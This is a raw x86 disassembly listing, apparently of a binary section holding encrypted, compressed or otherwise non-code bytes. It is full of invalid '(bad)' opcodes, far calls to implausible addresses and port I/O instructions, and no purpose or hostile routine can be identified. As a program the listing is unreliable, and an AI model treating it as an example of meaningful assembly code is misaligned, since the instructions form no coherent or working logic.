  404c31:	mov    esi,0xc6eaaba3
  404c36:	jge    0x404c11
  404c38:	(bad)
  404c3b:	or     eax,0xd108c71f
  404c40:	mov    edx,0x31a415aa
  404c45:	dec    ebp
  404c46:	adc    al,0x4b
  404c48:	push   0xe3381834
  404c4d:	mov    WORD PTR [edx-0x4d0dc41a],ds
  404c53:	or     edi,eax
  404c55:	call   0xae74:0x6a2ad33d
  404c5c:	add    DWORD PTR [edi],esp
  404c5e:	mov    ebx,0x9c3249dd
  404c63:	xchg   ecx,eax
  404c64:	jl     0x404cda
  404c66:	pop    edx
  404c67:	inc    edi
  404c68:	adc    ecx,DWORD PTR [edi-0x439a180e]
  404c6e:	ror    BYTE PTR [ebx+0x62],1
  404c71:	pop    eax
  404c72:	push   esi
  404c73:	and    edi,ebx
  404c75:	fstp   st(5)
  404c77:	mov    WORD PTR [esi],gs
  404c79:	(bad)  [ebx-0x66]
  404c7c:	test   WORD PTR [ecx],bx
  404c7f:	loop   0x404c32
  404c81:	and    al,0xbd
  404c83:	cmp    BYTE PTR [esi],bl
  404c85:	call   0xd4318867
  404c8a:	push   0x73912ebf
  404c8f:	inc    esi
  404c90:	jecxz  0x404cac
  404c92:	jns    0x404cb4
  404c94:	pop    esi
  404c95:	fimul  WORD PTR [eax]
  404c97:	cld    
  404c98:	and    bl,BYTE PTR [edx+0x7d]
  404c9b:	ins    BYTE PTR es:[edi],dx
  404c9c:	mov    ds:0xc0b2a9cc,al
  404ca1:	dec    ebx
  404ca2:	jecxz  0x404cfa
  404ca4:	out    0x6d,al
  404ca6:	out    0x8f,eax
  404ca8:	test   al,0xc0
  404caa:	cmp    al,0xb0
  404cac:	scas   eax,DWORD PTR es:[edi]
  404cad:	stos   DWORD PTR es:[edi],eax
  404cae:	les    ebp,FWORD PTR [esi+ebp*2-0x40]
  404cb2:	fsin   
  404cb4:	inc    esi
  404cb5:	pop    ebp
  404cb6:	xor    al,0x43
  404cb8:	ffree  st(0)
  404cba:	ds scas al,BYTE PTR es:[edi]
  404cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cbd:	sbb    ch,BYTE PTR [esi-0x32458e75]
  404cc3:	bound  eax,QWORD PTR [edi-0x5a994dc3]
  404cc9:	mov    eax,0x66d48c30
  404cce:	aam    0x3e
  404cd0:	clc    
  404cd1:	add    eax,DWORD PTR [eax]
  404cd3:	ja     0x404cfa
  404cd5:	jns    0x404d4a
  404cd7:	out    0xaf,eax
  404cd9:	inc    esp
  404cda:	(bad)  
  404cdb:	pop    ebx
  404cdc:	test   BYTE PTR [eax+0x117c5634],dh
  404ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ce3:	inc    edi
  404ce4:	xor    eax,0x8a17bea8
  404ce9:	and    ch,cl
  404ceb:	xchg   al,dl
  404ced:	cmp    BYTE PTR [edx+0x5b95e228],0x83
  404cf4:	mov    DWORD PTR [edx+0x3],esi
  404cf7:	mov    dl,0xbe
  404cf9:	aas    
  404cfa:	adc    al,0x98
  404cfc:	bnd js 0x404c8d
  404cff:	test   al,0x21
  404d01:	fcomp  DWORD PTR [eax-0x69]
  404d04:	sub    dl,BYTE PTR [esi+0x30]
  404d07:	xor    eax,0x99ad7f85
  404d0c:	outs   dx,DWORD PTR ds:[esi]
  404d0d:	mov    dl,0xb0
  404d0f:	imul   esp,DWORD PTR [esi],0x4e8e74fc
  404d15:	inc    ebp
  404d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d17:	add    bh,cl
  404d19:	sub    al,0xbd
  404d1b:	mov    ds:0x17d5aecd,al
  404d20:	jmp    DWORD PTR [ebp+0x1f]
  404d23:	outs   dx,BYTE PTR ds:[esi]
  404d24:	mov    ebp,0x4d24c4f8
  404d29:	sbb    BYTE PTR [edi+edi*2+0x2dac0753],ch
  404d30:	rcr    ah,cl
  404d32:	sub    ah,BYTE PTR [ebp+0x3ffad476]
  404d38:	push   0xffffffb0
  404d3a:	push   esi
  404d3b:	mov    eax,ds:0x108321e9
  404d40:	jnp    0x404cde
  404d42:	mov    ebp,0xf06cae6b
  404d47:	fcmovnbe st,st(2)
  404d49:	push   eax
  404d4a:	adc    al,0xf1
  404d4c:	daa    
  404d4d:	mov    edx,0xad64baea
  404d52:	cmp    dh,BYTE PTR [esi+0x3c]
  404d55:	push   edx
  404d56:	pop    es
  404d57:	pop    ecx
  404d58:	loop   0x404d38
  404d5a:	cmp    dl,BYTE PTR [edi+0x499731b4]
  404d60:	add    BYTE PTR [eax+esi*4+0x737b01bb],dl
  404d67:	jge    0x404d24
  404d69:	inc    ecx
  404d6a:	lds    ecx,FWORD PTR [ebx+0x34]
  404d6d:	out    0x51,al
  404d6f:	shl    edi,cl
  404d71:	sar    edx,0x3
  404d74:	jle    0x404d8f
  404d76:	jle    0x404dcd
  404d78:	xor    al,0xf1
  404d7a:	shl    DWORD PTR es:[ecx-0x30],cl
  404d7e:	imul   DWORD PTR [edi+0x6ff7c83e]
  404d84:	sub    ebx,esi
  404d86:	rol    BYTE PTR [edi+0x3ab30a36],0xed
  404d8d:	out    dx,eax
  404d8e:	in     eax,dx
  404d8f:	imul   edi,DWORD PTR [eax+0x22],0xc8a7a52f
  404d96:	hlt    
  404d97:	xchg   edi,eax
  404d98:	jnp    0x404dd8
  404d9a:	mov    esp,0x30e6e3de
  404d9f:	sbb    dl,BYTE PTR [ecx+0x63]
  404da2:	dec    edi
  404da3:	popa   
  404da4:	pop    ebx
  404da5:	dec    ebp
  404da6:	sahf   
  404da7:	in     al,dx
  404da8:	sub    DWORD PTR [ebp-0x63e871c1],ecx
  404dae:	cmp    eax,0x398c5d1
  404db3:	ss ret 0x170f
  404db7:	pop    DWORD PTR [edi+0x4152289d]
  404dbd:	add    ch,al
  404dbf:	in     al,0x1c
  404dc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dc2:	lock dec ecx
  404dc4:	mov    cl,cl
  404dc6:	out    0xee,eax
  404dc8:	addr16 push esi
  404dca:	lds    eax,FWORD PTR [ebx+0x88e03fc]
  404dd0:	ss adc al,0x9f
  404dd3:	rol    DWORD PTR [edx+esi*1],0x4d
  404dd7:	adc    bl,BYTE PTR [ebx+edx*1+0x2b7e9fe]
  404dde:	loopne 0x404d77
  404de0:	dec    ecx
  404de1:	std    
  404de2:	pop    ss
  404de3:	fsubr  DWORD PTR [ebp+0x3975188e]
  404de9:	iret   
  404dea:	shr    DWORD PTR [ecx+esi*8],cl
  404ded:	lds    ebp,FWORD PTR [edx+esi*1]
  404df0:	test   DWORD PTR [ebp+0x64],eax
  404df3:	scas   al,BYTE PTR es:[edi]
  404df4:	mov    bl,0xee
  404df6:	sbb    edi,DWORD PTR [ecx]
  404df8:	jbe    0x404d9a
  404dfa:	das    
  404dfb:	fdiv   DWORD PTR [eax-0x66]
  404dfe:	ins    BYTE PTR es:[edi],dx
  404dff:	dec    eax
  404e00:	jb     0x404d9f
  404e02:	mov    edx,0xff4b08d4
  404e07:	inc    DWORD PTR [ecx-0xe]
  404e0a:	(bad)  
  404e0b:	pop    ecx
  404e0c:	test   al,0x45
  404e0e:	mov    BYTE PTR [ecx-0x1a],dl
  404e11:	pop    ebx
  404e12:	pushf  
  404e13:	jbe    0x404e4e
  404e15:	inc    ecx
  404e16:	or     edx,DWORD PTR [ebp+0x64]
  404e19:	lahf   
  404e1a:	dec    esi
  404e1b:	inc    esp
  404e1c:	outs   dx,DWORD PTR ds:[esi]
  404e1d:	mov    eax,ds:0xfb771e83
  404e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e23:	xchg   esp,eax
  404e24:	mov    DWORD PTR [esi-0x22],ecx
  404e27:	loope  0x404e59
  404e29:	push   0xa071fff8
  404e2e:	sbb    BYTE PTR [eax-0x56ba96de],0x8
  404e35:	popa   
  404e36:	mov    WORD PTR [edi+0x67b0d162],?
  404e3c:	pop    ebp
  404e3d:	and    dl,cl
  404e3f:	rol    DWORD PTR [edx+0x42],0xe8
  404e43:	inc    edx
  404e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e45:	xor    edi,edx
  404e47:	mov    esp,0x82c8cf6b
  404e4c:	and    al,0xb1
  404e4e:	(bad)  
  404e50:	pop    ebx
  404e51:	ins    BYTE PTR es:[edi],dx
  404e52:	enter  0xb26a,0x6f
  404e56:	stos   BYTE PTR es:[edi],al
  404e57:	xor    al,0x7c
  404e59:	ficom  DWORD PTR [esi+ebp*1+0x18]
  404e5d:	fisttp WORD PTR [eax+0x74]
  404e60:	adc    eax,0xd9da5f65
  404e65:	add    BYTE PTR [ecx],ah
  404e67:	cs out dx,al
  404e69:	dec    esi
  404e6a:	ins    DWORD PTR es:[edi],dx
  404e6b:	cmp    cl,0x79
  404e6e:	cmp    eax,0xe2504531
  404e73:	fild   QWORD PTR [ecx+0x7]
  404e76:	inc    esp
  404e77:	dec    ebx
  404e78:	mov    ah,0x8e
  404e7a:	test   BYTE PTR [esi],cl
  404e7c:	mov    al,ds:0xc7cf1ed9
  404e81:	pop    eax
  404e82:	jns    0x404e30
  404e84:	icebp  
  404e85:	push   ss
  404e86:	xor    cl,ch
  404e88:	mov    edx,0xbfd9e633
  404e8d:	out    dx,al
  404e8e:	frstor [eax-0x3f]
  404e91:	call   0x84de5ee8
  404e96:	jne    0x404eca
  404e98:	dec    esi
  404e99:	sar    BYTE PTR [edx-0x6d0727f0],cl
  404e9f:	cs addr16 jns 0x404ebf
  404ea3:	push   0x2beceba5
  404ea8:	addr16 pop ebp
  404eaa:	repz call 0xc459:0x86c34b0
  404eb2:	stos   BYTE PTR es:[edi],al
  404eb3:	lds    ebp,FWORD PTR [esi+0x3e895f83]
  404eb9:	ret    
  404eba:	pop    edi
  404ebb:	psadbw mm5,QWORD PTR [esi-0x49ca5cb9]
  404ec2:	inc    edx
  404ec3:	and    eax,0x33a2d1f8
  404ec8:	jne    0x404ea1
  404eca:	push   ss
  404ecb:	pop    esi
  404ecc:	mov    ds:0xcd03eec8,eax
  404ed1:	out    0x6e,eax
  404ed3:	push   eax
  404ed4:	aam    0xb1
  404ed6:	ret    
  404ed7:	jns    0x404ef5
  404ed9:	pop    ss
  404eda:	sbb    edi,DWORD PTR [edx+0x78]
  404edd:	adc    eax,0xe324af1
  404ee2:	xchg   ebx,eax
  404ee3:	stc    
  404ee4:	aam    0xa9
  404ee6:	bound  ebp,QWORD PTR [ebx]
  404ee8:	adc    eax,0xcf8cd44e
  404eed:	mov    ecx,0xe76adc16
  404ef2:	sar    cl,cl
  404ef4:	js     0x404e87
  404ef6:	int    0x66
  404ef8:	jbe    0x404ed8
  404efa:	in     al,0x51
  404efc:	sub    DWORD PTR ds:0x1ab5c778,edx
  404f02:	out    0x18,al
  404f04:	add    al,BYTE PTR [esi]
  404f06:	add    eax,0x7becdb5
  404f0b:	sahf   
  404f0c:	call   FWORD PTR [edx-0x46]
  404f0f:	clc    
  404f10:	shr    DWORD PTR [ecx-0x61497523],1
  404f16:	push   cs
  404f17:	push   ebx
  404f18:	lahf   
  404f19:	(bad)  
  404f1a:	jno    0x404eab
  404f1c:	pop    ebp
  404f1d:	es nop
  404f1f:	fdivr  QWORD PTR [eax+0x2a9ba619]
  404f25:	enter  0x2231,0x2a
  404f29:	fisubr DWORD PTR [edi]
  404f2b:	call   0xd895:0x4049de39
  404f32:	sbb    DWORD PTR [ebx],esi
  404f34:	cmp    ecx,ebx
  404f36:	pop    ebp
  404f37:	xchg   DWORD PTR [esi],esp
  404f39:	add    BYTE PTR es:[ebx+0x62],cl
  404f3d:	pop    ss
  404f3e:	mov    ds:0xeaa4d0bd,al
  404f43:	pop    ebx
  404f44:	lods   al,BYTE PTR ds:[esi]
  404f45:	fld    DWORD PTR [esi]
  404f47:	in     eax,dx
  404f48:	push   edx
  404f49:	pop    esi
  404f4a:	jmp    0x5f2f48e1
  404f4f:	fidiv  WORD PTR [eax+0x5f]
  404f52:	dec    ebp
  404f53:	adc    al,0x14
  404f55:	jmp    0x6645baee
  404f5a:	sub    esp,DWORD PTR [ebp+0x264e379e]
  404f60:	jmp    0xf44d8733
  404f65:	call   0x4397:0xb1676595
  404f6c:	cwde   
  404f6d:	arpl   WORD PTR [edx+0x3f],bx
  404f70:	inc    ebx
  404f71:	pop    edx
  404f72:	sar    edi,cl
  404f74:	jl     0x404fa9
  404f76:	push   eax
  404f77:	or     BYTE PTR [eax],0xc5
  404f7a:	ds mov eax,0xe5cedfb3
  404f80:	out    dx,al
  404f81:	clc    
  404f82:	and    cl,BYTE PTR [eax-0x2dec1ea7]
  404f88:	jmp    0x404f6d
  404f8a:	in     al,dx
  404f8b:	push   cs
  404f8c:	call   0xb7a8:0xcdc3c873
  404f93:	ds push esi
  404f95:	(bad)  
  404f96:	jne    0x404f7e
  404f98:	nop
  404f99:	outs   dx,BYTE PTR ds:[esi]
  404f9a:	jno    0x404f6e
  404f9c:	in     eax,dx
  404f9d:	add    ebp,DWORD PTR [esi+0x365fc898]
  404fa3:	fs dec edx
  404fa5:	or     dl,BYTE PTR [eax]
  404fa7:	push   ebp
  404fa8:	sbb    eax,0xde547b06
  404fad:	inc    eax
  404fae:	mov    gs,ecx
  404fb0:	pop    esi
  404fb1:	pop    edx
  404fb2:	pushf  
  404fb3:	das    
  404fb4:	push   ebx
  404fb5:	xchg   esp,eax
  404fb6:	adc    eax,0xedace55b
  404fbb:	scas   al,BYTE PTR es:[edi]
  404fbc:	xor    ebp,DWORD PTR [ecx+ebx*8+0x13e26cce]
  404fc3:	cmp    ebp,ebp
  404fc5:	leave  
  404fc6:	scas   eax,DWORD PTR es:[edi]
  404fc7:	mov    esp,0x68a1d982
  404fcc:	cwde   
  404fcd:	jnp    0x404fff
  404fcf:	or     esp,edx
  404fd1:	icebp  
  404fd2:	sub    BYTE PTR [edx],bl
  404fd4:	xor    al,0x20
  404fd6:	(bad)  
  404fd7:	mov    dh,0x4c
  404fd9:	inc    ebp
  404fda:	push   ebx
  404fdb:	sar    DWORD PTR [edx-0x2b2128da],cl
  404fe1:	and    al,0x8d
  404fe3:	fwait
  404fe4:	rcl    BYTE PTR [eax-0x13],cl
  404fe7:	adc    al,0x7c
  404fe9:	sub    al,0xce
  404feb:	call   FWORD PTR [ebx]
  404fed:	and    eax,0x236102f0
  404ff2:	fnstenv ds:0xddf39ff5
  404ff8:	(bad)  
  404ff9:	dec    esi
  404ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ffb:	push   ecx
  404ffc:	daa    
  404ffd:	in     eax,dx
  404ffe:	std    
  404fff:	jge    0x405034
  405001:	aad    0xb8
  405003:	mov    DWORD PTR [esi+0x7f],ecx
  405006:	ret    0xd7ff
  405009:	inc    ebx
  40500a:	js     0x404ff7
  40500c:	aad    0x51
  40500e:	mov    dh,BYTE PTR [ecx-0x8]
  405011:	fs aaa 
  405013:	jp     0x405075
  405015:	or     al,0xe8
  405017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405018:	mov    ecx,0x5a2e98a7
  40501d:	ret    0xa8dc
  405020:	pusha  
  405021:	dec    esp
  405022:	fistp  QWORD PTR [ebx]
  405024:	xor    DWORD PTR [ebp-0x200a46f9],0x3f59287a
  40502e:	add    al,0xc8
  405030:	cmp    DWORD PTR [ebx+0x2d69217b],ebx
  405036:	add    DWORD PTR [ebp-0x17aa529],eax
  40503c:	adc    eax,0xd77447c9
  405041:	pop    edi
  405042:	mov    cs,ebx
  405044:	mov    bh,0xd2
  405046:	push   ds
  405047:	std    
  405048:	aad    0x32
  40504a:	pop    edx
  40504b:	or     ah,BYTE PTR [edi-0x4f]
  40504e:	inc    edx
  40504f:	icebp  
  405050:	icebp  
  405051:	jp     0x40509d
  405053:	test   DWORD PTR [esp+edx*1],ecx
  405056:	or     ch,BYTE PTR [ecx-0x3962f8]
  40505c:	pop    ebp
  40505d:	std    
  40505e:	test   DWORD PTR [eax+0x2e],edi
  405061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405062:	xchg   edx,eax
  405063:	xchg   edx,eax
  405064:	stc    
  405065:	scas   eax,DWORD PTR es:[edi]
  405066:	inc    esp
  405067:	pop    ds
  405068:	xor    ch,BYTE PTR [edi+0x343bcfd7]
  40506e:	aas    
  40506f:	fnstenv [esi]
  405071:	xchg   esp,eax
  405072:	jo     0x4050e5
  405074:	out    dx,al
  405075:	pusha  
  405076:	sahf   
  405077:	and    esp,DWORD PTR [eax+0x9930e53]
  40507d:	or     DWORD PTR [edi+esi*1-0x32],ebx
  405081:	mov    ebp,edi
  405083:	inc    ebx
  405084:	pop    esp
  405085:	mov    bh,0xe7
  405087:	push   edx
  405088:	fmul   st,st(2)
  40508a:	cdq    
  40508b:	xor    bh,BYTE PTR [edx]
  40508d:	das    
  40508e:	ss loopne 0x405011
  405091:	fisttp QWORD PTR [ebx-0x11]
  405094:	mov    bh,0x5b
  405096:	mov    edx,0x5ab7b378
  40509b:	mov    ds:0x6159863,eax
  4050a0:	cmp    BYTE PTR [ebp+0x3368cd29],ch
  4050a6:	fidivr WORD PTR [edx-0x4d52dfeb]
  4050ac:	mov    eax,ds:0xe58c0761
  4050b1:	inc    edx
  4050b2:	xchg   edi,eax
  4050b3:	pop    esi
  4050b4:	jecxz  0x4050db
  4050b6:	xor    eax,0x451d7e8
  4050bb:	clc    
  4050bc:	xchg   ebp,eax
  4050bd:	jmp    0x70ca:0x2eaa41cf
  4050c4:	push   esp
  4050c5:	fiadd  DWORD PTR ds:0x856ff6b3
  4050cb:	xchg   edx,eax
  4050cc:	sbb    BYTE PTR [eax-0xfab6642],ch
  4050d2:	adc    edi,DWORD PTR [eax+0x45949ab9]
  4050d8:	loope  0x40505a
  4050da:	movsx  ecx,ax
  4050dd:	xchg   esi,eax
  4050de:	dec    edx
  4050df:	cdq    
  4050e0:	sub    BYTE PTR [ebx-0x4f989435],bh
  4050e6:	push   ebx
  4050e7:	dec    esp
  4050e8:	stos   DWORD PTR es:[edi],eax
  4050e9:	sub    DWORD PTR [edi+0x51924bae],eax
  4050ef:	pop    ss
  4050f0:	xchg   ebx,eax
  4050f1:	int3   
  4050f2:	sar    dh,1
  4050f4:	pop    ss
  4050f5:	and    al,BYTE PTR [edx-0x13]
  4050f8:	sbb    eax,0xf61263c7
  4050fd:	outs   dx,DWORD PTR ds:[esi]
  4050fe:	mov    bl,0x90
  405100:	hlt    
  405101:	jo     0x40512b
  405103:	not    esp
  405105:	sub    cl,BYTE PTR [ecx]
  405107:	jp     0x405141
  405109:	iret   
  40510a:	and    ebp,DWORD PTR [esi+edx*8]
  40510d:	push   cs
  40510e:	xchg   BYTE PTR [edx+0x69],ah
  405111:	int3   
  405112:	adc    al,0x80
  405114:	ror    DWORD PTR [edx+0x1f4c6ba0],cl
  40511a:	inc    edx
  40511b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40511d:	dec    edi
  40511e:	(bad)  
  40511f:	jnp    0x40516f
  405121:	adc    edx,DWORD PTR [ebx+edi*8+0x31583dbc]
  405128:	repz push es
  40512a:	gs out dx,al
  40512c:	and    al,0xd6
  40512e:	call   0xa5eb8a37
  405133:	iret   
  405134:	jno    0x405147
  405136:	ret    0xd9fb
  405139:	sub    al,0x3c
  40513b:	or     DWORD PTR ds:0xa8e2cb82,0x2f
  405142:	pop    edx
  405143:	and    al,0x55
  405145:	sbb    DWORD PTR [eax-0x63b7b5f7],0x5a
  40514c:	jl     0x4051cd
  40514e:	popa   
  40514f:	cmp    ah,BYTE PTR [ebx-0x5f]
  405152:	push   es
  405153:	pop    edi
  405154:	xlat   BYTE PTR ds:[ebx]
  405155:	push   edi
  405156:	call   0xf85b937c
  40515b:	(bad)  [ebp+0x6e]
  40515e:	lds    edx,FWORD PTR [edx+0x4a]
  405161:	or     dl,BYTE PTR [ebx]
  405163:	pusha  
  405164:	(bad)  
  405165:	jo     0x4051a6
  405167:	ret    0xddab
  40516a:	popa   
  40516b:	pop    ebx
  40516c:	call   0xcb9a:0x6f0a03b9
  405173:	inc    esp
  405174:	adc    DWORD PTR [ebp+0x40],esi
  405177:	sub    BYTE PTR [ebp-0x7e],0x15
  40517b:	xor    BYTE PTR [ecx-0x4085946d],ah
  405181:	and    BYTE PTR [ecx-0x34fb6a51],bl
  405187:	or     ah,dl
  405189:	in     al,0xda
  40518b:	retf   0x5181
  40518e:	dec    esi
  40518f:	lahf   
  405190:	outs   dx,DWORD PTR ds:[esi]
  405191:	fs jp  0x405178
  405194:	lea    eax,[ebx+eax*2+0x19]
  405198:	clc    
  405199:	push   cs
  40519a:	mov    bh,0x84
  40519c:	mov    ebx,DWORD PTR [esi-0x78]
  40519f:	push   0xffffffce
  4051a1:	xor    BYTE PTR [ebx+0x3e566848],0x8c
  4051a8:	(bad)
  4051ab:	adc    DWORD PTR [edi+edi*4],ecx
  4051ae:	or     BYTE PTR [eax],al
  4051b0:	adc    eax,DWORD PTR [edx+0x540a8354]
  4051b6:	dec    esp
  4051b7:	mov    esp,0xc0e7026b
  4051bc:	adc    bh,BYTE PTR [eax]
  4051be:	fwait
  4051bf:	cmp    DWORD PTR [eax+0x687220c8],edx
  4051c5:	imul   ebp,ebp,0x7f1bdf5a
  4051cb:	out    dx,eax
  4051cc:	scas   eax,DWORD PTR es:[edi]
  4051cd:	xchg   esi,esi
  4051cf:	xchg   eax,eax
  4051d1:	sub    dl,BYTE PTR [edx]
  4051d3:	and    DWORD PTR [ecx],esp
  4051d5:	mov    ah,0x60
  4051d7:	xchg   esp,eax
  4051d8:	mov    ?,ecx
  4051da:	sub    DWORD PTR [ebx+0x3e],ebp
  4051dd:	scas   eax,DWORD PTR es:[edi]
  4051de:	int3   
  4051df:	cwde   
  4051e0:	mov    esi,0x76649554
  4051e5:	cdq    
  4051e6:	push   es
  4051e7:	(bad)  
  4051e8:	xor    eax,0xb2d9dfa
  4051ed:	rol    BYTE PTR [ebp-0x73],0xd8
  4051f1:	mov    ah,0x8e
  4051f3:	jl     0x4051dc
  4051f5:	push   0x426dd6fe
  4051fa:	inc    ecx
  4051fb:	stc    
  4051fc:	push   0x6c
  4051fe:	jnp    0x405251
  405200:	mov    dl,0xc8
  405202:	daa    
  405203:	jl     0x405225
  405205:	gs inc ebp
  405207:	mov    ebx,0x995d2d98
  40520c:	mov    ecx,0x10fddbbe
  405211:	or     eax,0xa5e248ab
  405216:	fs jnp 0x40526d
  405219:	jge    0x40525c
  40521b:	scas   eax,DWORD PTR es:[edi]
  40521c:	jmp    0x1af4c348
  405221:	fld    QWORD PTR [edi]
  405223:	repz and ebx,edi
  405226:	push   ebx
  405227:	out    dx,eax
  405228:	aaa    
  405229:	je     0x4051c4
  40522b:	popf   
  40522c:	scas   al,BYTE PTR es:[edi]
  40522d:	sub    eax,0xfb536d65
  405232:	pop    es
  405233:	sbb    BYTE PTR [ebx-0x71],ch
  405236:	cs dec edi
  405238:	adc    eax,0x9291d61a
  40523d:	xor    BYTE PTR [esi+ebp*2-0x6691a359],dh
  405244:	and    DWORD PTR [ebx-0x38c6150b],edi
  40524a:	pop    ds
  40524b:	scas   eax,DWORD PTR es:[edi]
  40524c:	adc    BYTE PTR [eax+0x58],ah
  40524f:	push   0xfb1fecdd
  405254:	xor    ch,BYTE PTR [ecx+0x772fc6e3]
  40525a:	sub    DWORD PTR [edx-0x58],ebp
  40525d:	dec    edi
  40525e:	or     al,0x89
  405260:	cdq    
  405261:	cs lock jns 0x405205
  405265:	clc    
  405266:	outs   dx,BYTE PTR ds:[esi]
  405267:	adc    eax,0x54b5a708
  40526c:	inc    ebp
  40526d:	push   0xffffffc3
  40526f:	in     eax,0xb1
  405271:	xor    eax,0x9a648ae4
  405276:	push   ebp
  405277:	xchg   ecx,eax
  405278:	push   0x7f
  40527a:	jge    0x405225
  40527c:	test   BYTE PTR [ecx],ch
  40527e:	and    esp,DWORD PTR [esi+ebx*1-0x726c6535]
  405285:	cli    
  405286:	test   BYTE PTR [edi-0x40],ah
  405289:	push   esp
  40528a:	xchg   esp,eax
  40528b:	out    0x95,eax
  40528d:	out    0x86,eax
  40528f:	(bad)  
  405290:	ins    DWORD PTR es:[edi],dx
  405291:	xchg   edi,eax
  405292:	gs (bad) 
  405294:	je     0x405243
  405296:	inc    eax
  405297:	enter  0xf6da,0xec
  40529b:	push   0xe7db7852
  4052a0:	call   0x997ced4b
  4052a5:	mov    al,ds:0x41285f3f
  4052aa:	stos   BYTE PTR es:[edi],al
  4052ab:	sub    BYTE PTR [ecx-0xddf9010],0x13
  4052b2:	push   ss
  4052b3:	lahf   
  4052b4:	sbb    dl,ah
  4052b6:	jmp    0x4c8c:0x72dcc0b4
  4052bd:	inc    ebx
  4052be:	adc    DWORD PTR [ecx+0x62],0x15
  4052c2:	dec    esp
  4052c3:	push   eax
  4052c4:	scas   eax,DWORD PTR es:[edi]
  4052c5:	in     al,dx
  4052c6:	call   0x3e0a36de
  4052cb:	mov    dh,0x62
  4052cd:	mov    ebp,0x901dbc12
  4052d2:	call   0xad9c2496
  4052d7:	or     al,0x2e
  4052d9:	mov    esp,0xe30e26c
  4052de:	jae    0x40533b
  4052e0:	inc    esi
  4052e1:	xchg   BYTE PTR [eax-0x5d],dl
  4052e4:	andnps xmm1,xmm7
  4052e7:	clc    
  4052e8:	mov    eax,ds:0xef28084a
  4052ed:	fstp   TBYTE PTR [ecx]
  4052ef:	push   0x36d6fab8
  4052f4:	fild   QWORD PTR [ecx+eiz*4-0x5d2acea8]
  4052fb:	inc    eax
  4052fc:	sub    dl,BYTE PTR [esp+esi*1]
  4052ff:	mov    cl,0xab
  405301:	and    DWORD PTR [edx],ebp
  405303:	inc    esi
  405304:	xchg   BYTE PTR [esi],ch
  405306:	loop   0x4052e3
  405308:	dec    ebp
  405309:	fwait
  40530a:	imul   edi,DWORD PTR [edi-0x7f],0x6b
  40530e:	dec    edi
  40530f:	xor    ah,BYTE PTR [ecx]
  405311:	setae  BYTE PTR ds:0xbf27b39d
  405318:	jb     0x40538b
  40531a:	out    0x21,al
  40531c:	jo     0x40531c
  40531e:	outs   dx,DWORD PTR ds:[esi]
  40531f:	aas    
  405320:	outs   dx,BYTE PTR ds:[esi]
  405321:	or     eax,0x8dc11164
  405326:	adc    ebp,DWORD PTR [ebx-0x48]
  405329:	stos   BYTE PTR es:[edi],al
  40532a:	xchg   edx,eax
  40532b:	cmp    ecx,ebp
  40532d:	pop    ds
  40532e:	(bad)  
  40532f:	mov    esp,0xeb1b6817
  405334:	shl    esi,1
  405336:	xchg   DWORD PTR [ecx+0x68433d2c],eax
  40533c:	test   eax,eax
  40533e:	cwde   
  40533f:	pop    edx
  405340:	mov    bh,0x96
  405342:	pop    edi
  405343:	jp     0x4053a2
  405345:	xchg   BYTE PTR [eax+0x79],bl
  405348:	aam    0xb6
  40534a:	inc    esi
  40534b:	jecxz  0x4052fc
  40534d:	push   eax
  40534e:	or     BYTE PTR ds:0x1bcbd69c,0x51
  405355:	mov    WORD PTR [edx+0x45],gs
  405358:	mov    DWORD PTR [edx-0x57],0x9d662609
  40535f:	adc    DWORD PTR [edx],0xffffffb4
  405362:	outs   dx,BYTE PTR ds:[esi]
  405363:	adc    DWORD PTR [ecx],0x48
  405366:	mov    al,ds:0xeb54dc72
  40536b:	mov    edx,DWORD PTR [edi+eiz*4]
  40536e:	(bad)  
  40536f:	retf   
  405370:	jmp    0x4053d0
  405372:	sbb    DWORD PTR [esi+0x55f3943f],ecx
  405378:	call   0xbafd:0x8b047e9e
  40537f:	mov    edi,DWORD PTR [ebx+0xbd4d2ed]
  405385:	and    dh,BYTE PTR [edi]
  405387:	not    DWORD PTR [ebx-0x50b85972]
  40538d:	pusha  
  40538e:	retf   
  40538f:	xchg   ecx,eax
  405390:	xchg   sp,ax
  405392:	sub    ecx,DWORD PTR [edx+0x40e5e667]
  405398:	in     eax,0xd
  40539a:	lods   eax,DWORD PTR ds:[esi]
  40539b:	enter  0x5631,0x48
  40539f:	repz xchg esi,eax
  4053a1:	sub    al,0xea
  4053a3:	loop   0x4053de
  4053a5:	in     eax,0x17
  4053a7:	shl    dl,1
  4053a9:	inc    ecx
  4053aa:	mov    al,0x16
  4053ac:	push   ss
  4053ad:	pop    eax
  4053ae:	mov    ch,0xb7
  4053b0:	xchg   ecx,eax
  4053b1:	fist   DWORD PTR [eax+0x48ec28b8]
  4053b7:	xchg   edx,eax
  4053b8:	call   0x93ee00c
  4053bd:	mov    bh,BYTE PTR [esi+0x238d36d5]
  4053c3:	push   ecx
  4053c4:	mov    al,ds:0x1e0b1d4b
  4053c9:	mov    cl,0xbd
  4053cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053cc:	leave  
  4053cd:	mov    ebp,0xbf8949
  4053d2:	cli    
  4053d3:	adc    BYTE PTR [esi],bh
  4053d5:	int    0x17
  4053d7:	mov    al,ds:0x549cf5f1
  4053dc:	jbe    0x405404
  4053de:	je     0x40537e
  4053e0:	iret   
  4053e1:	add    al,0x3b
  4053e3:	and    ebp,DWORD PTR [esi-0x5d]
  4053e6:	(bad)  
  4053e7:	call   0xac96:0x422f5a1a
  4053ee:	push   cs
  4053ef:	inc    esp
  4053f0:	outs   dx,DWORD PTR ds:[esi]
  4053f1:	ss stc 
  4053f3:	inc    edx
  4053f4:	leave  
  4053f5:	or     al,0x12
  4053f7:	dec    edi
  4053f8:	dec    ebp
  4053f9:	ins    DWORD PTR es:[edi],dx
  4053fa:	push   esi
  4053fb:	xchg   esp,eax
  4053fc:	sub    edx,DWORD PTR [ecx+0x782b2d63]
  405402:	(bad)  
  405405:	jbe    0xead467a5
  40540b:	jno    0x405412
  40540d:	push   esp
  40540e:	pushf  
